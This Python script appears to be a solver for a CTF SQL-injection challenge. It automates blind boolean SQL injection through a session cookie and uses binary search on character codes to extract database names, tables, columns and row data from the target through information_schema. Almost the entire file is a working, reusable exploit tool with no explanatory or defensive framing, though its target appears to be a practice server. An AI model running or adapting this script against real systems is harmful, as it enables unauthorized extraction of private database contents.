# -*- coding: utf-8 -*-

from typing import List, Dict, Tuple
import requests
from bs4 import BeautifulSoup as bs

attack_url: str = "http://ctf2.segfaulthub.com:7777/sqli_6/mypage.php"
user_id: str = "asdf"
user_pw: str = "asdf"

l: int = 0
r: int = 0
num: int = 0

database_lst: List[str] = []
table_lst: List[List[str]] = []
column_lst: List[List[str]] = []
data_lst: List[List[str]] = []

def sql_result(sql: str) -> bool:
    global user_pw

    cookies = {'user': sql,
           'PHPSESSID': 'sbu45s107bmhk6sh6nn8svau7f'}

    response = requests.post(url=attack_url, cookies=cookies)
    soup = bs(response.text, 'html.parser')
    check_sum = str(soup.find_all('input')[1])

    if "Nothing Here..." in check_sum:
        return True
    else: return False
    
def counting(query: str) -> int:
    l = 0
    r = 100

    while (l <= r):
        num = (l + r) // 2
        sql: str = f"{user_id}' and (({query}) < {str(num)}) #"

        if sql_result(sql):
            r = num - 1
        else:
            sql: str = f"{user_id}' and (({query}) = {str(num)}) #"
            if sql_result(sql):
                return num
            else: l = num + 1
    
    return -1

def char_length(query: str, cnt: int) -> int:
    l = 0
    r = 100

    while (l <= r):
        num = (l + r) // 2
        sql = f"{user_id}' and ((char_length(({query}))) < {str(num)}) #"

        if sql_result(sql):
            r = num - 1
        else:
            sql: str = f"{user_id}' and ((char_length(({query}))) = {str(num)}) #"
            if sql_result(sql):
                return num
            else: l = num + 1

def find_name(query: str, length: int) -> str:
    tmp = []
    for i in range(length):
        l = 0
        r = 128

        while (l <= r):
            num = (l + r) // 2
            sql = f"{user_id}' and (ascii(substr(({query}), {str(i + 1)}, 1)) < {str(num)}) #"

            if sql_result(sql):
                r = num - 1
            else:
                sql = f"{user_id}' and (ascii(substr(({query}), {str(i + 1)}, 1)) = {str(num)}) #"
                if sql_result(sql):
                    tmp.append(chr(num))
                    break
                else: l = num + 1
    return "".join(tmp)

def find_db() -> List[str]:
    global database_lst

    print(f"database searching...")
    query: str = "select count(database())"
    cnt = counting(query)

    for i in range(cnt):
        query = "select database()"
        length = char_length(query, cnt)
        database_lst.append(find_name(query, length))

    return database_lst

def find_table():
    global database_lst, table_lst

    print("--- db ---")
    for i in range(len(database_lst)):
        print(f"{i}: {database_lst[i]}")
    
    idx = input("DB를 입력해주세요. 없을 경우 모든 DB를 확인합니다 ->")

    print(f"table searching...")
    if idx == "":
        for i in range(len(database_lst)):
            table_names: List[str] = []

            query: str = f"select count(table_name) from information_schema.tables where table_schema = '{database_lst[i]}'"
            cnt = counting(query)

            for j in range(cnt):
                print(f"{i} database {j} table searching...")

                query = f"select table_name from information_schema.tables where table_schema = '{database_lst[i]}' limit {j}, 1"

                res = char_length(query, cnt)
                table_name = find_name(query, res)

                table_names.append(table_name)

            table_lst.append(table_names)
    else:
        table_names: List[str] = []

        query: str = f"select count(table_name) from information_schema.tables where table_schema = '{database_lst[int(idx)]}'"
        cnt = counting(query)

        for j in range(cnt):
            print(f"{int(idx)} database {j} table searching...")

            query = f"select table_name from information_schema.tables where table_schema = '{database_lst[int(idx)]}' limit {j}, 1"

            res = char_length(query, cnt)
            table_name = find_name(query, res)

            table_names.append(table_name)

        table_lst.append(table_names)

    return table_lst

def find_column():
    global database_lst, table_lst, column_lst

    print("--- db ---")
    for i in range(len(database_lst)):
        print(f"{i}: {database_lst[i]}")
    
    print("--- table ---")
    for i in range(len(table_lst)):
        for j in range(len(table_lst[i])):
            print(f"i: {i}, j: {j}, {table_lst[i][j]}")

    db_idx, tb_idx = map(str, input("DB, table을 순서대로 입력해주세요. 없을 경우 모든 DB의 table을 확인합니다 -> ").split())

    if db_idx == "":
        for i in range(len(database_lst)):
            for j in range(len(table_lst[i])):
                column_names: List[str] = []

                query: str = f"select count(column_name) from information_schema.columns where table_name = '{table_lst[i][j]}'"
                cnt = counting(query)

                for k in range(cnt):
                    print(f"{i + 1} database {j + 1} table {k + 1} column searching...")

                    query = f"select column_name from information_schema.columns where table_name = '{table_lst[i][j]}' limit {str(k)}, 1"
                    length = char_length(query, cnt)

                    column_name = find_name(query, length)
                    column_names.append(column_name)
                column_lst.append(column_names)
    else:
        column_names: List[str] = []

        query: str = f"select count(column_name) from information_schema.columns where table_name = '{table_lst[0][int(tb_idx)]}'"
        cnt = counting(query)

        for k in range(cnt):
            print(f"{int(tb_idx)} database {int(tb_idx)} table {k} column searching...")

            query = f"select column_name from information_schema.columns where table_name = '{table_lst[0][int(tb_idx)]}' limit {k}, 1"
            length = char_length(query, cnt)

            column_name = find_name(query, length)
            column_names.append(column_name)
        column_lst.append(column_names)
    return column_lst

def find_data():
    global database_lst, table_lst, column_lst, data_lst

    print("--- db ---")
    for i in range(len(database_lst)):
        print(f"{i}: {database_lst[i]}")
    
    print("--- table ---")
    for i in range(len(table_lst)):
        for j in range(len(table_lst[i])):
            print(f"i: {i}, j: {j}, {table_lst[i][j]}")

    print("--- column ---")
    for j in range(len(column_lst)):
        for k in range(len(column_lst[i])):
            print(f"j: {j}, k: {k}, {column_lst[j][k]}")

    db_idx, tb_idx, col_idx = map(str, input("DB, table, column을 순서대로 입력해주세요. 없을 경우 모든 DB를 확인합니다 -> ").split())

    if db_idx == "":
        for i in range(len(database_lst)):
            for j in range(len(table_lst[i])):
                for k in range(len(column_lst[j])):
                    datas: List[str] = []

                    query: str = f"select count({column_lst[j][k]}) from {table_lst[i][j]}"
                    cnt = counting(query)

                    for l in range(cnt):
                        print(f"{i + 1} database {j + 1} table {k + 1} column {l + 1} data searching...")
                        query = f"select {column_lst[j][k]} from {table_lst[i][j]} limit {str(l)}, 1"
                        length = char_length(query, cnt)

                        data = find_name(query, length)
                        datas.append(data)
                    data_lst.append(datas)
    else:
        datas: List[str] = []

        query: str = f"select count({column_lst[0][int(col_idx)]}) from {table_lst[0][int(tb_idx)]}"
        cnt = counting(query)

        for l in range(cnt):
            print(f"{int(db_idx)} database {int(tb_idx)} table {int(col_idx)} column {l} data searching...")
            query = f"select {column_lst[0][int(col_idx)]} from {table_lst[0][int(tb_idx)]} limit {l}, 1"
            length = char_length(query, cnt)

            data = find_name(query, length)
            datas.append(data)
        data_lst.append(datas)
    return data_lst

try:
    find_db()
    print(database_lst)
    
    find_table()
    print(table_lst)
    
    find_column()
    print(column_lst)

    find_data()
    print(data_lst)
except Exception as e:
    print(type(e))